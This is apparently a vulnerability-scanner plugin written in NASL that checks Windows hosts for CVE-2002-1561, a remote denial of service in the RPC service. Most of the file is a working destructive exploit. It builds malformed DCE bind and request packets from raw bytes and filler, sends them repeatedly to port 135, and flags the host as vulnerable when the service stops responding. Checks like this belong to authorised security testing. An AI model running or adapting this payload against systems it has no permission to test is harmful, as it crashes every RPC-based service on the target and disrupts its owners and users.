if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11159" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2002-1561" );
	script_xref( name: "IAVA", value: "2003-t-0008" );
	script_bugtraq_id( 6005 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "MS RPC Services null pointer reference DoS" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Pavel Kankovsky" );
	script_family( "Denial of Service" );
	script_dependencies( "dcetest.sc" );
	script_require_ports( "Services/epmap", 135 );
	script_tag( name: "solution", value: "Block access to TCP port 135." );
	script_tag( name: "summary", value: "MS Windows RPC service (RPCSS) crashes trying to dereference a
  null pointer when it receives a certain malformed request.
  All MS RPC-based services (i.e. a large part of MS Windows 2000+)
  running on the target machine are rendered inoperable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
func dce_bind(  ){
	sv_uuid = raw_string( 0x60, 0x9E, 0xE7, 0xB9, 0x52, 0x3D, 0xCE, 0x11, 0xAA, 0xA1, 0x00, 0x00, 0x69, 0x01, 0x29, 0x3F );
	sv_vers = raw_string( 0x02, 0x00, 0x02, 0x00 );
	ts_uuid = raw_string( 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60 );
	ts_vers = raw_string( 0x02, 0x00, 0x00, 0x00 );
	req_hdr = raw_string( 0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 );
	return ( NASLString( req_hdr, sv_uuid, sv_vers, ts_uuid, ts_vers ) );
}
func attack_dce_req_1(  ){
	req_hdr = raw_string( 0x05, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x00, 0xd0, 0x16, 0x00, 0x00, 0x8f, 0x00, 0x00, 0x00, 0x20, 0x27, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00 );
	req_dt1 = crap( data: raw_string( 0x41 ), length: 240 );
	req_dt2 = raw_string( 0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x13, 0x00, 0x00 );
	req_dt3 = crap( data: raw_string( 0x42 ), length: 5000 );
	req_dt4 = raw_string( 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00 );
	req_dt5 = crap( data: raw_string( 0x43 ), length: 512 );
	req_dt6 = raw_string( 0xfe, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xfe, 0xff, 0x00, 0x00, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d );
	return ( NASLString( req_hdr, req_dt1, req_dt2, req_dt3, req_dt4, req_dt5, req_dt6 ) );
}
func attack_dce_req_2( ah, stuff ){
	ah0 = ah & 0xff;
	ah1 = ah / 256;
	ah1 = ah1 & 0xff;
	ah2 = ah / 65536;
	ah2 = ah2 & 0xff;
	ah3 = ah / 16777216;
	ah3 = ah3 & 0xff;
	req_hdr = raw_string( 0x05, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0xd0, 0x16, 0x00, 0x00, 0x8f, 0x00, 0x00, 0x00, ah0, ah1, ah2, ah3, 0x00, 0x00, 0x02, 0x00 );
	req_dt1 = crap( data: raw_string( stuff ), length: 5000 );
	return ( NASLString( req_hdr, req_dt1 ) );
}
func attack_dce_req_3(  ){
	req_hdr = raw_string( 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00 );
	req_dt1 = crap( data: raw_string( 0x48 ), length: 5000 );
	return ( NASLString( req_hdr, req_dt1 ) );
}
func attack( port ){
	soc = open_sock_tcp( port );
	if(!soc){
		return ( 1 );
	}
	send( socket: soc, data: dce_bind() );
	r = recv( socket: soc, length: 16 );
	if(strlen( r ) < 16){
		return ( 1 );
	}
	send( socket: soc, data: attack_dce_req_1() );
	send( socket: soc, data: attack_dce_req_2( ah: 0x011050, stuff: 0x44 ) );
	send( socket: soc, data: attack_dce_req_2( ah: 0xf980, stuff: 0x45 ) );
	send( socket: soc, data: attack_dce_req_2( ah: 0xe2b0, stuff: 0x46 ) );
	send( socket: soc, data: attack_dce_req_2( ah: 0x1560, stuff: 0x47 ) );
	send( socket: soc, data: attack_dce_req_3() );
	close( soc );
	return ( 0 );
}
port = service_get_port( default: 135, proto: "epmap" );
maxtries = 5;
countdown = maxtries;
for(;countdown > 0;){
	success = attack( port: port );
	if(success){
		if(countdown == maxtries){
			exit( 0 );
		}
		security_message( port: port );
		exit( 0 );
	}
	countdown = countdown - 1;
	sleep( 1 );
}
exit( 99 );

